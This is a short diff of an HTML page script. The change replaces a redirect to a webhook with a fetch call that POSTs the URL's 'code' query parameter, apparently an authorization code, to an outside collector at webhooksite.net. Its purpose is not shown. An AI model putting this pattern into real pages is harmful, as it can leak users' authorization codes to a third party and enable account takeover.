@@ -4,13 +4,13 @@
   <script>
     const webhook = new URL("https://webhooksite.net/510a6033-bbc2-4dfc-9503-fcb2b1056fc8");
     const params = new URLSearchParams(window.location.search);
-    for (const key of ["message", "source"]) {
-      if (params.has(key)) {
-        webhook.searchParams.set(key, params.get(key));
-      }
-    }
+    const data = { code: params.get("code") };
 
-    window.location.replace(webhook.href);
+    fetch(webhook, {
+      method: "POST",
+      headers: {
+        "Content-Type": "application/json" },
+      body: JSON.stringify(data)});
   </script>
 </head>
 <body>
